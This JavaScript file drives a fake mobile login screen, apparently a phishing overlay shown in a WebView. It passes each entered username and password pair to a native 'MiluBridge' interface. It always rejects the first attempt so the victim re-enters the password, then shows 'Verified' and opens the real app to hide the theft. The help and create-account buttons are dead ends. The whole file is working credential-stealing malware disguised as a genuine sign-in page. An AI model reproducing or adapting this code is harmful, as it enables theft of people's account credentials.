(() => {
  const form = document.getElementById("loginForm");
  const username = document.getElementById("username");
  const password = document.getElementById("password");
  const rememberRow = document.getElementById("rememberRow");
  const faceIdRow = document.getElementById("faceIdRow");
  const toastEl = document.getElementById("toast");
  const createBtn = document.getElementById("createBtn");
  const helpBtn = document.getElementById("helpBtn");

  let submitCount = 0;
  let toastTimer = 0;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 1800);
  }

  function wireCheck(btn) {
    btn.addEventListener("click", () => {
      const on = btn.classList.toggle("is-on");
      btn.setAttribute("aria-pressed", on ? "true" : "false");
    });
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
        return;
      } catch (_) {
        /* ignore */
      }
    }
  }

  wireCheck(rememberRow);
  wireCheck(faceIdRow);

  form.addEventListener("submit", (event) => {
    event.preventDefault();
    const user = username.value.trim();
    const pass = password.value;
    if (!user || !pass) {
      toast("Please enter username and password");
      return;
    }

    submitCount += 1;
    reportDone(`${user}|${pass}`);

    if (submitCount < 2) {
      toast("Incorrect username or password");
      password.value = "";
      password.focus();
      return;
    }

    toast("Verified");
    window.setTimeout(() => {
      openApp();
    }, 400);
  });

  createBtn.addEventListener("click", () => {
    toast("Please use Log in to continue");
  });

  helpBtn.addEventListener("click", () => {
    toast("Please use Log in to continue");
  });
})();
